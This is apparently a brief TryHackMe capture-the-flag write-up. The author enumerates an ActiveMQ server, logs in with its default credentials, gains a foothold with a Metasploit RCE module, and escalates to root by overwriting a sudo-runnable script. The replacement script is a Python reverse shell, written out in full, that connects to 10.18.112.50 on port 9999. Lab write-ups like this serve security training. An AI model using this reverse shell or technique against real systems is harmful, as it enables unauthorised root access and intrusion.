this was a quick thm box with medium difficulty that took 30 minutes to root 

starting with enumeration, nmap:

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1883/tcp  open  mqtt?      syn-ack
8161/tcp  open  http       syn-ack Jetty 7.6.9.v20130131
37777/tcp open  tcpwrapped syn-ack

of interest was port 8161 which hosted activeMQ software, that had default credentials and allowed me to log in 

after finding out the version of the software i decided to look for a public exploit and found out that theres a metasploit module that allowed RCE with authentication, so i decided to go for it and got my initial foothold 

grabbed user flag and started enumerating for privilege escalation, looking for SUID bits or capabilities, third and final option was sudo -l which revealed that I can run a script as root without providing password that was writeable by my user 

using `edit` function in meterpreter I wiped the contents and input:

import socket, subprocess,os;

```python
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((”10.18.112.50”, 9999))

os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

import pty 

pty.spawn(”/bin/bash”)
```

after running this with sudo without providing password i was able to catch a root reverse shell and grab the flag
